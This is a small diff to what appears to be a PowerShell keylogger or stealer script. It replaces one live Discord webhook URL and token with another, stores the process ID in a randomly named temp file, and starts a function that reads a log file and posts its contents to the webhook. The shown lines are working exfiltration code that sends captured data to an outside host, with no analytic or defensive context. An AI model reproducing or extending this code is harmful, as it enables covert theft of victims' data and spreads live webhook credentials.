@@ -1,4 +1,4 @@
-$webhook = "https://discord.com/api/webhooks/1132663927323512943/Vf18ScKFm785ZPl5mKkNM2c-aAWfmxFAcsrEYtaEK_uWgFxWXkgDqOWzYl9Foqg-EBid";$counter = 0;$PID > "$env:temp/DdBPKCytRe";
+$webhook = "https://discord.com/api/webhooks/1132712474945265724/aythmt2tVTnj-vWcgvpDahj4sqcq0ND0h6qd8GoKY9PK22f1CGeI82sp8vQF9m84B2_o";$counter = 0;$PID > "$env:temp/DdBPKCytRe";
 function sendWebhook(){
   $logs = Get-Content "$logFile" | Out-String;
   $Body = @{
